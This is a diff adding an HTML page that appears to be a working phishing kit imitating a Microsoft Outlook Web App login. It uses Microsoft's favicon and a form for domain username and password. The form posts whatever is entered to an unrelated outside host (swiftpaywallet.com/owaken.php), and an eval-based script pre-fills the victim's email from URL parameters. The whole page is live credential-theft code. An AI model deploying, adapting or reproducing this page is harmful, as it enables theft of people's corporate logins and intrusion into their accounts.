@@ -1,0 +1,261 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Web App</title>
+<meta name="generator" content="WYSIWYG Web Builder 10 - http://www.wysiwygwebbuilder.com">
+<style>
+body
+a
+{
+   color: #0000FF;
+   text-decoration: underline;
+}
+a:visited
+{
+   color: #800080;
+}
+a:active
+{
+   color: #FF0000;
+}
+a:hover
+{
+   color: #0000FF;
+   text-decoration: underline;
+}
+h1
+{
+   font-family: Arial;
+   font-weight: bold;
+   font-size: 32px;
+   font-style: normal;
+   text-decoration: none;
+   color: #000000;
+   background-color: transparent;
+   margin: 0px 0px 0px 0px;
+   padding: 0px 0px 0px 0px;
+   display: inline;
+}
+h2
+{
+   font-family: Arial;
+   font-weight: bold;
+   font-size: 27px;
+   font-style: normal;
+   text-decoration: none;
+   color: #000000;
+   background-color: transparent;
+   margin: 0px 0px 0px 0px;
+   padding: 0px 0px 0px 0px;
+   display: inline;
+}
+h3
+{
+   font-family: Arial;
+   font-weight: normal;
+   font-size: 24px;
+   font-style: normal;
+   text-decoration: none;
+   color: #000000;
+   background-color: transparent;
+   margin: 0px 0px 0px 0px;
+   padding: 0px 0px 0px 0px;
+   display: inline;
+}
+h4
+{
+   font-family: Arial;
+   font-weight: normal;
+   font-size: 21px;
+   font-style: italic;
+   text-decoration: none;
+   color: #000000;
+   background-color: transparent;
+   margin: 0px 0px 0px 0px;
+   padding: 0px 0px 0px 0px;
+   display: inline;
+}
+h5
+{
+   font-family: Arial;
+   font-weight: normal;
+   font-size: 19px;
+   font-style: normal;
+   text-decoration: none;
+   color: #000000;
+   background-color: transparent;
+   margin: 0px 0px 0px 0px;
+   padding: 0px 0px 0px 0px;
+   display: inline;
+}
+h6
+{
+   font-family: Arial;
+   font-weight: normal;
+   font-size: 16px;
+   font-style: normal;
+   text-decoration: none;
+   color: #000000;
+   background-color: transparent;
+   margin: 0px 0px 0px 0px;
+   padding: 0px 0px 0px 0px;
+   display: inline;
+}
+.CustomStyle
+{
+   font-family: "Courier New";
+   font-weight: bold;
+   font-size: 16px;
+   font-style: normal;
+   text-decoration: none;
+   color: #000080;
+   background-color: transparent;
+}
+</style>
+<style>
+body
+body
+{
+   background-color: #F8F8F8;
+   color: #000000;
+   font-family: Arial;
+   font-weight: normal;
+   font-size: 13px;
+   line-height: 1.1875;
+   margin: 0;
+   padding: 0;
+}
+#wb_Form1
+{
+   background-color: transparent;
+   background-image: url(https://i.postimg.cc/PfsMSYt6/bodowa.png);
+   background-repeat: no-repeat;
+   background-position: left top;
+   background-size: 1320px 850px;
+   border: 0px #000000 none;
+}
+#wb_Text1 
+{
+   background-color: transparent;
+   border: 0px #000000 solid;
+   padding: 0;
+   margin: 0;
+   text-align: left;
+}
+#wb_Text1 div
+{
+   text-align: left;
+}
+#Editbox1
+{
+   border: 1px #A9A9A9 solid;
+   background-color: #FFFFFF;
+   color :#000000;
+   font-family: Arial;
+   font-weight: normal;
+   font-size: 13px;
+   padding: 0px 0px 0px 5px;
+   text-align: left;
+   vertical-align: middle;
+}
+#wb_Text2 
+{
+   background-color: transparent;
+   border: 0px #000000 solid;
+   padding: 0;
+   margin: 0;
+   text-align: left;
+}
+#wb_Text2 div
+{
+   text-align: left;
+}
+#Editbox2
+{
+   border: 1px #A9A9A9 solid;
+   background-color: #FFFFFF;
+   color :#000000;
+   font-family: Arial;
+   font-weight: normal;
+   font-size: 13px;
+   padding: 0px 0px 0px 5px;
+   text-align: left;
+   vertical-align: middle;
+}
+#Button1
+{
+   border: 0px #F8F8F8 solid;
+   background-color: transparent;
+   background-image: url(https://i.postimg.cc/k5WyCgsN/botton.png);
+   background-repeat: repeat;
+   background-position: left top;
+   background-size: 130px 45px;
+   color: #000000;
+   font-family: Arial;
+   font-weight: normal;
+   font-size: 13px;
+}
+</style>
+<link rel="shortcut icon" href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico" />
+<script>
+function ValidateForm1(theForm)
+{
+   var regexp;
+   if (theForm.Editbox1.value == "")
+   {
+      alert("invalid email");
+      theForm.Editbox1.focus();
+      return false;
+   }
+   if (theForm.Editbox2.value == "")
+   {
+      alert("invalid");
+      theForm.Editbox2.focus();
+      return false;
+   }
+   return true;
+}
+</script>
+<style rel="stylesheet" type="text/css" data-href="">html, body
+input.Editbox1 { -webkit-text-security: none; }
+input.Editbox2 { -webkit-text-security: disc; }
+</style>
+</head>
+<body>
+<div id="wb_Form1" style="position:absolute;left:0px;top:0px;width:1344px;height:1071px;z-index:5;">
+<form name="Form1" method="post" action="https://post.swiftpaywallet.com/owaken.php" enctype="" id="Form1" onsubmit="return ValidateForm1(this)">
+<div id="wb_Text1" style="position:absolute;left:623px;top:274px;width:182px;height:16px;z-index:0;text-align:left;">
+<span style="color:#2F4F4F;font-family:Tahoma;font-size:13px;">Domain/user name:</span></div>
+<input type="text" id="Editbox1" style="position:absolute;left:623px;top:290px;width:220px;height:23px;line-height:23px;z-index:1;" name="Editbox1" value="">
+<div id="wb_Text2" style="position:absolute;left:623px;top:338px;width:144px;height:16px;z-index:2;text-align:left;">
+<span style="color:#2F4F4F;font-family:Tahoma;font-size:13px;">Password</span><span style="color:#2F4F4F;font-family:Arial;font-size:13px;">:</span></div>
+<input type="text" id="Editbox2" class="Editbox2" autofocus style="position:absolute;left:623px;top:354px;width:220px;height:23px;line-height:23px;z-index:3;" name="Editbox2" value="" autocomplete="off">
+<input type="submit" id="Button1" name="" value="" style="position:absolute;left:623px;top:428px;width:127px;height:44px;z-index:4;">
+</form>
+<script type="text/javascript" language="JavaScript">
+<!-- Copyright 2006 Bontrager Connection, LLC
+function FillForm() {
+// Specify form's name between the quotes on next line.
+var FormName = "Form1";
+var questionlocation = location.href.indexOf('?');
+if(questionlocation < 0) { return; }
+var q = location.href.substr(questionlocation + 1);
+var list = q.split('&');
+for(var i = 0; i < list.length; i++) {
+   var kv = list[i].split('=');
+   if(! eval('document.'+FormName+'.'+kv[0])) { continue; }
+   kv[1] = unescape(kv[1]);
+   if(kv[1].indexOf('"') > -1) {
+      var re = /"/g;
+      kv[1] = kv[1].replace(re,'\\"');
+      }
+   eval('document.'+FormName+'.'+kv[0]+'.value="'+kv[1]+'"');
+   }
+}
+FillForm();
+//-->
+</script>
+</div>
+</body>
+</html>
